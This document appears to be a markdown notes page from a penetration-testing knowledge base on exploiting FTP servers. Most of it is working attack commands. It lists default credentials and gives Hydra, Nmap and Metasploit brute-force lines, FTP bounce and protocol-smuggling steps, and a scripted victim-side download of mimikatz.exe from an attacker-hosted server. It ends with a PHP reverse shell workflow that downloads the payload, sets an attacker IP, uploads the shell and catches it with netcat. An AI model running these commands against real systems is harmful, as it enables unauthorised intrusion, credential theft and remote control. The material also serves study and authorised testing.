---
id: Exploitation
aliases: []
tags:
  - Networking/Services/FTP/Exploitation
links: "[[FTP]]"
---

<!-- Exploitation {{{-->
# Exploitation

___

<!-- Log In {{{-->
## Log In

<!-- Anonymous Login {{{-->
### Anonymous Login

FTP may allow connection without needing to specific identity

Anonymous login

```sh
ftp <target> [port]
```

<!-- Example {{{-->
> [!example]-
> Anonymous Login example
>
> ```sh
> ftp -p 10.129.42.253
> ```
>
> ```sh
> Connected to 10.129.42.253.
> 220 (vsFTPd 3.0.3)
> Name (10.129.42.253:user): anonymous
> 230 Login successful.
> Remote system type is UNIX.
> Using binary mode to transfer files.
> ```
<!-- }}} -->

Anonymous [[Usage#Web Browser Connection|Browser Login]]

```sh
ftp://anonymous:anonymous@<target>
```

<!-- }}} -->

<!-- Common Credentials {{{-->
### Common Credentials

FTP most common default credentials

<!-- Example {{{-->
> [!example]-
>
> ```
> anonymous:anonymous
> _anonymous:
> _ftp:ftp
> admin:admin
> root:root
> ftpuser:ftpuser
> test:test
> ```
<!-- }}} -->

<!-- }}} -->

<!-- Brute Force {{{-->
### Brute Force

<!-- Wordlist {{{-->
> [!tip]- Wordlist
>
> [SecLists](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt)
>
> ```sh
> /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt
> ```
<!-- }}} -->

[[Metasploit]] — FTP Authentication Scanner
(*[ftp_login](https://www.rapid7.com/db/modules/auxiliary/scanner/ftp/ftp_login/)*)

```sh
use auxiliary/scanner/ftp/ftp_login
```

<!-- Example {{{-->
> [!example]-
>
> Test FTP logins on a range of machines and report successful logins
>
> ```sh
> msf > use auxiliary/scanner/ftp/ftp_login
> ```
> ```sh
> msf auxiliary(ftp_login) > show actions
> ```
> ```sh
> msf auxiliary(ftp_login) > set ACTION <action_name>
> ```
> ```sh
> msf auxiliary(ftp_login) > show options
> ```
> ```sh
> msf auxiliary(ftp_login) > run
> ```
<!-- }}} -->

[[Hydra]] — Brute Force FTP login with

```sh
hydra -l <target_user> -P <password_list> <target> ftp
```

```sh
hydra -L <users_list> -p <password> ftp://<target>
```

[[Nmap]] — Perform brute force password auditing against FTP servers
(*[ftp-brute](https://nmap.org/nsedoc/scripts/ftp-brute.html)*)

```sh
nmap <target> -p 21 --script ftp-brute -oA ftp-script-brute
```
<!-- }}} -->

___
<!-- }}} -->

<!-- FTP Bounce Attack {{{-->
## FTP Bounce Attack

**FTP Bounce Attack** exploits the FTP protocol's ability to redirect traffic,
masking the attack source

<!-- Requirements {{{-->
> [!info]- Requirements
>
> - FTP valid credentials in the **FTP Middle Server**
> - FTP valid credentials in **Victim FTP Server**
> - Both server accepts the `PORT` command
> - Some directory of the **FTP Middle Server** is writeable
> - The **Middle Server** will have more access to the **Victim FTP Server**
<!-- }}} -->

Use the FTP server's `PORT` command to route data to another FTP server
at a specified port, making the attack seem to originate from that server

1. [[Enumeration#Service|Discover]] an FTP server that allows the `PORT` command

2. [[Usage#Connect|Connect]] to the server

3. Redirect data to the target

```sh
quote PORT <target>,<target_port>
```

4. Exploit FTP bouncing

> [!example]-
>
> [[Nmap]] scan a network
>
> ```sh
> nmap -v -b -P0 '<username>':'<password>'@'<ftp_server>' '<address_to_scan>' -oA ftp-bounce-exploit
> ```
>
> Initiate a file transfer or command to the target
>
> ```sh
> get filename
> ```

<!-- Other Protocols {{{-->
### Other Protocols

This behavior can be abused to make an FTP server interact with other protocols

A file (*containing a HTTP request*) can be uploaded to the FTP server
and sent to an arbitrary HTTP server:

1. **Upload the request** (*in a txt file*) to the server,
   to talk with another HTTP or FTP server

> [!info]
>
> The line endings need to be changed to `0x0d` `0x0a`

2. **Use** `REST X` **to avoid sending unwanted characters**

3. **Use** `PORT` **to connect to the arbitrary server and service**

4. **Use** `RETR` **to send the saved request** to the server

<!-- Warning {{{-->
> [!warning]
>
> It's highly possible that this will throw an error
> (e.g. *Socket not writeable*)
> as the connection doesn't last long enough to send the data
> with `RETR`.
>
> > [!tip]-
> >
> > To avoid this:
> >
> > - **Put the same request on after another**
> >  ([like this](https://book.hacktricks.wiki/en/files/posts.txt))
> >  until ~0.5MB, if sending the same HTTP request
> > - **Fill the request with "junk" data** relative to the protocol
> > - **Fill the request with a lot of null characters**
<!-- }}} -->

___

<!-- }}} -->

<!-- }}} -->

<!-- FileZilla Server Vulnerability {{{-->
## FileZilla Server Vulnerability

**[FileZilla](https://filezilla-project.org/) Server** usually binds to the
local administrative TCP port `14147`. If it is possible to create a tunnel
from the attacker machine to this port:

- Authenticate using a blank password
- Create a new user for the FTP service

___

<!-- }}} -->

<!-- }}} -->

<!-- Post-Exploitation {{{-->
# Post-Exploitation

<!-- Enumeration {{{-->
## Enumeration

List recognized commands

```sh
HELP
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> HELP
> 214-The following commands are recognized (* =>'s unimplemented):
> 214-CWD XCWD CDUP XCUP SMNT* QUIT PORT PASV 
> 214-EPRT EPSV ALLO* RNFR RNTO DELE MDTM RMD 
> 214-XRMD MKD XMKD PWD XPWD SIZE SYST HELP 
> 214-NOOP FEAT OPTS AUTH CCC* CONF* ENC* MIC* 
> 214-PBSZ PROT TYPE STRU MODE RETR STOR STOU 
> 214-APPE REST ABOR USER PASS ACCT* REIN* LIST 
> 214-NLST STAT SITE MLSD MLST 
> 214 Direct comments to root@drei.work
> ```
<!-- }}} -->

List extended features the server support

```sh
FEAT
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> FEAT
> 211-Features:
>  PROT
>  CCC
>  PBSZ
>  AUTH TLS
>  MFF modify;UNIX.group;UNIX.mode;
>  REST STREAM
>  MLST modify*;perm*;size*;type*;unique*;UNIX.group*;UNIX.mode*;UNIX.owner*;
>  UTF8
>  EPRT
>  EPSV
>  LANG en-US
>  MDTM
>  SSCN
>  TVFS
>  MFMT
>  SIZE
> 211 End
> ```
<!-- }}} -->

> [!tip]
>
> Enumerate the server with
[[Usage#File Operations|File Operation Commands]]

___
<!-- }}} -->

<!-- File Download {{{-->
## File Download

Download a file (*e.g., [[Mimikatz|mimikatz.exe]]*)

1. **ATTACKER**: [[pipx]] — Install [pyftpdlib](https://github.com/giampaolo/pyftpdlib)

```sh
pipx install pyftpdlib
```

> [!tip]-
>
> With pure-ftp use
> [fuse:ftp](https://github.com/telepresenceio/go-fuseftp)
> (*written in Go*)


2. **ATTACKER**: Host the FTP server

```sh
python -m pyftpdlib -p 21 -w
```

3. **ATTACKER** Place the file (*e.g., `mimikatz.exe`*) into the FTP root

4. **VICTIM**: Execute the following commands

> [!example]-
>
> ```sh
> echo open <attacker_ip> 21 > ftp.txt
> ```
> ```sh
> echo USER anonymous >> ftp.txt
> ```
> ```sh
> echo anonymous >> ftp.txt
> ```
> ```sh
> echo bin >> ftp.txt
> ```
> ```sh
> echo GET mimikatz.exe >> ftp.txt
> ```
> ```sh
> echo bye >> ftp.txt
> ```
> ```sh
> ftp -n -v -s:ftp.txt
> ```

___

<!-- }}} -->

<!-- Reverse Shell Over Website {{{-->
## Reverse Shell Over Website

Spawn a reverse shell over the web

> [!info]- Requirements
>
> - The targot allows FTP access over the web
> - The web server can run PHP files

<!-- Example {{{-->
> [!example]-
>
> 1. Download the payload
>
> ```sh
> wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php -O shell.php
> ```
>
> 2. Edit some variables in `shell.php`
>
> ```sh
> $ip = '<attacker_ip>';
> $port = 1234;
> ```
>
> 3. [[Usage#Connect|Connect]] to the FTP server and upload the payload
>
> ```sh
> ftp <target>
> ```
>
> ```sh
> ftp> put shell.php
> ```
>
> 4. Listen to the incoming connection
>
> ```sh
> nc -lvnp 1234
> ```
>
> 5. Query the exploit to esablish a connection back
>
> ```
> http://target.com/path/to/ftp/shell.php
> ```
<!-- }}} -->

___

<!-- }}} -->

<!-- }}} -->
